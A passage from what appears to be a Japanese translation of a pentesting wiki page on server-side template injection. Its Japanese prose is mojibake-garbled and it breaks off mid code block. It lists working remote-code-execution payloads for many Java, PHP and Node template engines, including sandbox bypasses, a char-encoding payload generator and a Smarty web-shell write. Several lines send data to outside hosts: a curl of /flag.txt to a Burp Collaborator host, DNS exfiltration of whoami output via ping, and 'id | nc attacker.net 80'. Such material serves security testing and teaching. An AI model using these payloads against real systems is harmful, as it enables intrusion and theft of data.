${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

[https://try.freemarker.apache.org](https://try.freemarker.apache.org) ã§ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (ãƒ¬ã‚¬ã‚·ãƒ¼)`
* `${7*'7'} ä½•ã‚‚ãªã—`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ãƒã‚¤ãƒ‘ã‚¹**

âš ï¸ Freemarkerã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒ2.3.30æœªæº€ã®å ´åˆã«ã®ã¿æ©Ÿèƒ½ã—ã¾ã™
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**è©³ç´°æƒ…å ±**

* FreeMarkerã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦ã¯[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**è©³ç´°æƒ…å ±**

* Velocityã‚»ã‚¯ã‚·ãƒ§ãƒ³ [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf (Java)

SSTIã®å…¸å‹çš„ãªãƒ†ã‚¹ãƒˆè¡¨ç¾ã¯`${7*7}`ã§ã™ã€‚ã“ã®è¡¨ç¾ã¯Thymeleafã§ã‚‚æ©Ÿèƒ½ã—ã¾ã™ã€‚ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã‚’é”æˆã—ãŸã„å ´åˆã€ä»¥ä¸‹ã®ãƒ†ã‚¹ãƒˆè¡¨ç¾ã®ã„ãšã‚Œã‹ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š

* SpringEL: `${T(java.lang.Runtime).getRuntime().exec('calc')}`
* OGNL: `${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}`

ã—ã‹ã—ã€ä»¥å‰ã«è¿°ã¹ãŸã‚ˆã†ã«ã€è¡¨ç¾ã¯ç‰¹åˆ¥ãªThymeleafå±æ€§ã§ã®ã¿æ©Ÿèƒ½ã—ã¾ã™ã€‚ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã®ç•°ãªã‚‹å ´æ‰€ã§è¡¨ç¾ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€Thymeleafã¯_å¼ã®ã‚¤ãƒ³ãƒ©ã‚¤ãƒ³åŒ–_ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ã“ã®æ©Ÿèƒ½ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€è¡¨ç¾ã‚’`[[...]]`ã¾ãŸã¯`[(...)]`ï¼ˆç‰¹æ®Šè¨˜å·ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã©ã†ã‹ã«å¿œã˜ã¦é¸æŠï¼‰ã®ä¸­ã«ç½®ãå¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€Thymeleafã®ãŸã‚ã®ã‚·ãƒ³ãƒ—ãƒ«ãªSSTIæ¤œå‡ºãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯`[[${7*7}]]`ã«ãªã‚Šã¾ã™ã€‚

ã—ã‹ã—ã€ä¸Šè¨˜ã®æ¤œå‡ºãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã™ã‚‹å¯èƒ½æ€§ã¯éå¸¸ã«ä½ã„ã§ã™ã€‚SSTIã®è„†å¼±æ€§ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãŒã‚³ãƒ¼ãƒ‰å†…ã§å‹•çš„ã«ç”Ÿæˆã•ã‚Œã‚‹ã¨ãã«é€šå¸¸ç™ºç”Ÿã—ã¾ã™ã€‚Thymeleafã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ãã®ã‚ˆã†ãªå‹•çš„ã«ç”Ÿæˆã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’è¨±å¯ã›ãšã€ã™ã¹ã¦ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã¯äº‹å‰ã«ä½œæˆã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€é–‹ç™ºè€…ãŒ_ãã®å ´ã§_æ–‡å­—åˆ—ã‹ã‚‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’ä½œæˆã—ãŸã„å ´åˆã€ç‹¬è‡ªã®TemplateResolverã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯å¯èƒ½ã§ã™ãŒã€éå¸¸ã«ã¾ã‚Œã«ã—ã‹ç™ºç”Ÿã—ã¾ã›ã‚“ã€‚

Thymeleafãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ã‚ˆã‚Šæ·±ãè¦‹ã‚‹ã¨ã€_**å¼ã®å‰å‡¦ç†**_ã¨å‘¼ã°ã‚Œã‚‹èˆˆå‘³æ·±ã„æ©Ÿèƒ½ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚äºŒé‡ã®ã‚¢ãƒ³ãƒ€ãƒ¼ã‚¹ã‚³ã‚¢(`__...__`)ã®é–“ã«ç½®ã‹ã‚ŒãŸè¡¨ç¾ã¯å‰å‡¦ç†ã•ã‚Œã€å‰å‡¦ç†ã®çµæœãŒé€šå¸¸ã®å‡¦ç†ä¸­ã«è¡¨ç¾ã®ä¸€éƒ¨ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä»¥ä¸‹ã¯Thymeleafãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰ã®å…¬å¼ãªä¾‹ã§ã™ï¼š
```java
#{selection.__${sel.code}__}
```
**è„†å¼±ãªä¾‹**
```markup
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>

http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**è©³ç´°æƒ…å ±**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹**

è¤‡æ•°ã®å¤‰æ•°å¼ãŒä½¿ç”¨ã§ãã¾ã™ã€‚`${...}` ãŒæ©Ÿèƒ½ã—ãªã„å ´åˆã¯ `#{...}`, `*{...}`, `@{...}` ã¾ãŸã¯ `~{...}` ã‚’è©¦ã—ã¦ãã ã•ã„ã€‚

* `/etc/passwd` ã‚’èª­ã‚€
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ç”Ÿæˆã®ãŸã‚ã®ã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆ
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**è©³ç´°æƒ…å ±**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Spring View Manipulation (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Pebbleã®å¤ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ ( < ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
æ–°ã—ã„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®Pebbleï¼š
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}



{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjavaã¯Hubspotã«ã‚ˆã£ã¦é–‹ç™ºã•ã‚ŒãŸã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã§ã€[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)ã§åˆ©ç”¨å¯èƒ½ã§ã™ã€‚

**Jinjava - ã‚³ãƒãƒ³ãƒ‰å®Ÿè¡Œ**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)ã«ã‚ˆã£ã¦ä¿®æ­£ã•ã‚Œã¾ã—ãŸã€‚
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**è©³ç´°æƒ…å ±**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã®åŒºåˆ‡ã‚Š
* `{{ }}` å¼ã®åŒºåˆ‡ã‚Š
* `{# #}` ã‚³ãƒ¡ãƒ³ãƒˆã®åŒºåˆ‡ã‚Š
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest"ã‚’æ¤œç´¢ã—ã€[Jinjavaãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆ on Github](https://github.com/HubSpot/jinjava/)ã‚’ç™ºè¦‹ã€‚
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**è©³ç´°æƒ…å ±**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

ELã¯ã€ãƒ—ãƒ¬ã‚¼ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³å±¤ï¼ˆã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ï¼‰ãŒã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ­ã‚¸ãƒƒã‚¯ï¼ˆç®¡ç†ãƒ“ãƒ¼ãƒ³ã‚ºï¼‰ã¨é€šä¿¡ã™ã‚‹ãŸã‚ã®é‡è¦ãªãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æä¾›ã—ã¾ã™ã€‚ELã¯ã€**è¤‡æ•°ã®JavaEEæŠ€è¡“**ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚ä¾‹ãˆã°ã€JavaServer FacesæŠ€è¡“ã€JavaServer Pages (JSP) æŠ€è¡“ã€Java EEã®Contexts and Dependency Injection (CDI)ãªã©ã§ã™ã€‚\
**ELã‚¤ãƒ³ã‚¿ãƒ¼ãƒ—ãƒªã‚¿ã®æ‚ªç”¨**ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã¶ã«ã¯ã€ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

ã“ã®Security Managerã®ãƒã‚¤ãƒ‘ã‚¹ã¯ã€ã“ã®[**writeup**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)ã‹ã‚‰å–ã‚‰ã‚Œã¾ã—ãŸã€‚
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ã¯ã€**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é‡è¦ãªã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çŸ¥è­˜ã®æ™®åŠã‚’ä½¿å‘½ã¨ã—ã¦**ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®å°‚é–€å®¶ãŒé›†ã¾ã‚‹æ´»ç™ºãªäº¤æµã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**è©³ç´°æƒ…å ±**

* Smartyã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦ã¯ã€[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = ã‚¨ãƒ©ãƒ¼`
* `{{foobar}} ä½•ã‚‚è¡¨ç¤ºã•ã‚Œãªã„`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå½¢å¼**
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**è©³ç´°æƒ…å ±**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection) ã® Twig ãŠã‚ˆã³ Twig (Sandboxed) ã‚»ã‚¯ã‚·ãƒ§ãƒ³
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Platesã¯Twigã«è§¦ç™ºã•ã‚Œã¦ã„ã¾ã™ãŒã€ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã¯ãªãã€ãƒã‚¤ãƒ†ã‚£ãƒ–PHPãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã™ã€‚

ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ï¼š
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
ãƒšãƒ¼ã‚¸ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆï¼š
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
layout ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlibã¨HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB)ã¯ã€Pearã«ç§»æ¤ã•ã‚ŒãŸPHPlibã¨åŒã˜ã§ã™ã€‚

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
`authors.php`
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**è©³ç´°æƒ…å ±**

* Jadeã‚»ã‚¯ã‚·ãƒ§ãƒ³ã«ã¤ã„ã¦ã¯[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template)ã¯ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã‚’è¡Œã‚ãªã„PHPãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚¨ãƒ³ã‚¸ãƒ³ã§ã€XMLã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦æ–‡æ›¸ã‚’ç•°ãªã‚‹éƒ¨åˆ†ã«åˆ†å‰²ã—ã¾ã™ã€‚
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ï¼ˆè©³ç´°ã¯[ã“ã¡ã‚‰](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)ï¼‰ã€‚
```bash
